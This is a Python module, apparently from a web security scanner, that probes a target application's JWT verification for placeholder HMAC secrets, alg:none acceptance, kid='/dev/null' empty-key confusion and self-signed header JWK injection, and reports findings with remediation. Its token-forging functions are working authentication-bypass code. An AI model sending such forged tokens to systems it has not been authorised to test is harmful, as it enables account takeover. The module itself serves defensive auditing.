"""JWT verification audit adapter (intrusive, web): `jwt_attack`.

Verifies whether a target application's JWT validator has common verification flaws:
1. `jwt:weak-secret` — checks whether an HS256/HS384/HS512 token was signed with a known
   placeholder development key (e.g. `secret`, `changeme`, `development`).
2. `jwt:alg-none-accepted` — checks against a verification endpoint whether a token with a
   corrupted signature is rejected (401/403) while an unsigned `alg: "none"` variant is accepted (2xx).
3. `jwt:kid-null-accepted` / `jwt:jwk-injection-accepted` — checks whether an empty-key `kid`
   reference or unpinned header `jwk` parameter is accepted when a corrupted signature is rejected.

Plaintext tokens are never persisted in finding evidence (only a truncated SHA-256 fingerprint).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json

import httpx

from ...core.config import Settings
from ..harness import HarnessContext, NormalizedFinding, TestAdapter, register
from .jwt_analyze import decode_segment, tokens_in

PLACEHOLDER_SECRETS: tuple[str, ...] = (
    'secret',
    'changeme',
    'password',
    '123456',
    'jwt-secret',
    'development',
    'test',
    'admin',
    'key',
    'supersecret',
)

_ALG_DIGEST = {
    'hs256': hashlib.sha256,
    'hs384': hashlib.sha384,
    'hs512': hashlib.sha512,
}


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode('ascii')


def _b64url_decode(segment: str) -> bytes | None:
    padded = segment + '=' * (-len(segment) % 4)
    try:
        return base64.urlsafe_b64decode(padded.encode('ascii'))
    except (ValueError, TypeError):
        return None


def _sign_hmac(header: dict, payload_b64: str, secret: bytes, digest_mod=hashlib.sha256) -> str:
    header_b64 = _b64url_encode(json.dumps(header, separators=(',', ':'), sort_keys=True).encode('utf-8'))
    signing_input = f'{header_b64}.{payload_b64}'.encode('ascii')
    sig = hmac.new(secret, signing_input, digest_mod).digest()
    return f'{header_b64}.{payload_b64}.{_b64url_encode(sig)}'


def check_weak_hmac_secret(token: str, candidates: tuple[str, ...] = PLACEHOLDER_SECRETS) -> NormalizedFinding | None:
    """Offline check for known placeholder HMAC secrets on HS256/HS384/HS512 tokens."""
    parts = (token or '').split('.')
    if len(parts) != 3 or not parts[2]:
        return None
    header = decode_segment(parts[0]) or {}
    payload = decode_segment(parts[1]) or {}
    alg = str(header.get('alg') or '').lower()
    digest_mod = _ALG_DIGEST.get(alg)
    if digest_mod is None:
        return None
    sig_bytes = _b64url_decode(parts[2])
    if not sig_bytes:
        return None
    signing_input = f'{parts[0]}.{parts[1]}'.encode('ascii')
    fingerprint = hashlib.sha256(token.encode('utf-8')).hexdigest()[:12]

    for candidate in candidates:
        expected = hmac.new(candidate.encode('utf-8'), signing_input, digest_mod).digest()
        if hmac.compare_digest(sig_bytes, expected):
            return NormalizedFinding(
                rule='jwt:weak-secret',
                title='JWT signed with a known placeholder HMAC secret',
                description=(
                    f'The {alg.upper()} signature on token {fingerprint} matched a known default/placeholder '
                    'signing secret, allowing arbitrary token forgery.'
                ),
                remediation='Rotate the JWT signing key to a high-entropy random secret (at least 256 bits) stored in a secrets manager.',
                severity='critical',
                verified=True,
                evidence={
                    'token': fingerprint,
                    'alg': alg.upper(),
                    'issuer': str(payload.get('iss') or '')[:120],
                    'matched_placeholder': True,
                    'secret_length': len(candidate),
                    'proof_type': 'offline_hmac_verify',
                    'verified': True,
                },
            )
    return None


def build_alg_none_token(token: str) -> str | None:
    parts = (token or '').split('.')
    if len(parts) < 2:
        return None
    header = decode_segment(parts[0]) or {}
    new_header = {**header, 'alg': 'none', 'typ': header.get('typ', 'JWT')}
    header_b64 = _b64url_encode(json.dumps(new_header, separators=(',', ':')).encode('utf-8'))
    return f'{header_b64}.{parts[1]}.'


def build_corrupted_token(token: str) -> str | None:
    parts = (token or '').split('.')
    if len(parts) != 3 or not parts[2]:
        return None
    sig = parts[2]
    flipped = ('A' if sig[0] != 'A' else 'B') + sig[1:]
    return f'{parts[0]}.{parts[1]}.{flipped}'


def build_kid_null_token(token: str) -> str | None:
    parts = (token or '').split('.')
    if len(parts) < 2:
        return None
    header = decode_segment(parts[0]) or {}
    new_header = {**header, 'alg': 'HS256', 'kid': '/dev/null'}
    return _sign_hmac(new_header, parts[1], b'')


def build_jwk_injected_token(token: str) -> str | None:
    parts = (token or '').split('.')
    if len(parts) < 2:
        return None
    header = decode_segment(parts[0]) or {}
    canary_key = b'argus-verification-key'
    jwk = {'kty': 'oct', 'k': _b64url_encode(canary_key), 'alg': 'HS256'}
    new_header = {**header, 'alg': 'HS256', 'jwk': jwk}
    return _sign_hmac(new_header, parts[1], canary_key)


class JwtAttackAdapter(TestAdapter):
    name = 'jwt_attack'
    tier = 'intrusive'
    target_kinds = ('web',)
    description = 'Verifies JWT signing weaknesses (placeholder HMAC secrets, alg:none acceptance, kid/jwk verifier confusion).'

    def available(self, settings: Settings) -> bool:
        return True

    async def run(self, plan_params: dict, asset, scope, ctx: HarnessContext) -> list[NormalizedFinding]:
        if ctx.tier != 'intrusive':
            return []
        target = (ctx.target or asset.target).rstrip('/')
        endpoint = str(plan_params.get('endpoint') or '/')
        if not endpoint.startswith('/'):
            endpoint = '/'

        candidate_tokens: list[str] = []
        if isinstance(plan_params.get('token'), str):
            candidate_tokens.extend(tokens_in(plan_params['token']))
        for val in (ctx.auth_headers or {}).values():
            candidate_tokens.extend(tokens_in(str(val)))

        findings: list[NormalizedFinding] = []
        async with httpx.AsyncClient(
            base_url=target, timeout=httpx.Timeout(10.0), follow_redirects=False,
            trust_env=False, verify=True, limits=httpx.Limits(max_connections=2),
            headers=ctx.auth_headers or None,
        ) as client:
            if not candidate_tokens:
                await ctx.rate_limiter.acquire()
                try:
                    resp = await client.get(endpoint)
                    text = '\n'.join(
                        str(v) for k, v in resp.headers.items()
                        if k.lower() in ('set-cookie', 'authorization', 'x-auth-token')
                    ) + '\n' + resp.text[:200_000]
                    candidate_tokens.extend(tokens_in(text))
                except httpx.HTTPError:
                    pass

            seen_tokens: set[str] = set()
            for token in candidate_tokens:
                if token in seen_tokens:
                    continue
                seen_tokens.add(token)
                fingerprint = hashlib.sha256(token.encode('utf-8')).hexdigest()[:12]

                weak = check_weak_hmac_secret(token)
                if weak is not None:
                    findings.append(weak)

                # Verification oracle checks require confirming that a corrupted signature is rejected (401/403).
                corrupted = build_corrupted_token(token)
                if not corrupted:
                    continue
                await ctx.rate_limiter.acquire()
                try:
                    bad_resp = await client.get(endpoint, headers={'Authorization': f'Bearer {corrupted}'})
                except httpx.HTTPError:
                    continue
                if bad_resp.status_code not in (401, 403):
                    continue

                alg_none = build_alg_none_token(token)
                if alg_none:
                    await ctx.rate_limiter.acquire()
                    try:
                        none_resp = await client.get(endpoint, headers={'Authorization': f'Bearer {alg_none}'})
                    except httpx.HTTPError:
                        none_resp = None
                    if none_resp is not None and 200 <= none_resp.status_code < 300:
                        findings.append(NormalizedFinding(
                            rule='jwt:alg-none-accepted',
                            title=f'Unsigned JWT (alg: none) accepted on {endpoint}',
                            description=(
                                f'Endpoint {endpoint} rejected a corrupted signature ({bad_resp.status_code}) '
                                f'but accepted an unsigned alg:none token ({none_resp.status_code}).'
                            ),
                            remediation='Explicitly pin allowed JWT algorithms in the verifier and reject "none".',
                            severity='critical',
                            verified=True,
                            evidence={
                                'endpoint': endpoint,
                                'token': fingerprint,
                                'corrupted_status': bad_resp.status_code,
                                'alg_none_status': none_resp.status_code,
                                'proof_type': 'verification_oracle',
                                'verified': True,
                            },
                        ))

                kid_null = build_kid_null_token(token)
                if kid_null:
                    await ctx.rate_limiter.acquire()
                    try:
                        kid_resp = await client.get(endpoint, headers={'Authorization': f'Bearer {kid_null}'})
                    except httpx.HTTPError:
                        kid_resp = None
                    if kid_resp is not None and 200 <= kid_resp.status_code < 300:
                        findings.append(NormalizedFinding(
                            rule='jwt:kid-null-accepted',
                            title=f'Empty-key JWT kid header accepted on {endpoint}',
                            description=(
                                f'Endpoint {endpoint} rejected a corrupted signature ({bad_resp.status_code}) '
                                f'but accepted a token signed with an empty key via kid="/dev/null" ({kid_resp.status_code}).'
                            ),
                            remediation='Validate kid against an allowlist of key identifiers; never pass kid to filesystem paths.',
                            severity='critical',
                            verified=True,
                            evidence={
                                'endpoint': endpoint,
                                'token': fingerprint,
                                'corrupted_status': bad_resp.status_code,
                                'kid_status': kid_resp.status_code,
                                'proof_type': 'verification_oracle',
                                'verified': True,
                            },
                        ))

                jwk_tok = build_jwk_injected_token(token)
                if jwk_tok:
                    await ctx.rate_limiter.acquire()
                    try:
                        jwk_resp = await client.get(endpoint, headers={'Authorization': f'Bearer {jwk_tok}'})
                    except httpx.HTTPError:
                        jwk_resp = None
                    if jwk_resp is not None and 200 <= jwk_resp.status_code < 300:
                        findings.append(NormalizedFinding(
                            rule='jwt:jwk-injection-accepted',
                            title=f'Self-signed header JWK accepted on {endpoint}',
                            description=(
                                f'Endpoint {endpoint} rejected a corrupted signature ({bad_resp.status_code}) '
                                f'but accepted a token signed with an embedded header JWK ({jwk_resp.status_code}).'
                            ),
                            remediation='Ignore untrusted jwk/jku headers in incoming tokens and verify against trusted server-side keys only.',
                            severity='critical',
                            verified=True,
                            evidence={
                                'endpoint': endpoint,
                                'token': fingerprint,
                                'corrupted_status': bad_resp.status_code,
                                'jwk_status': jwk_resp.status_code,
                                'proof_type': 'verification_oracle',
                                'verified': True,
                            },
                        ))
        return findings


register(JwtAttackAdapter())
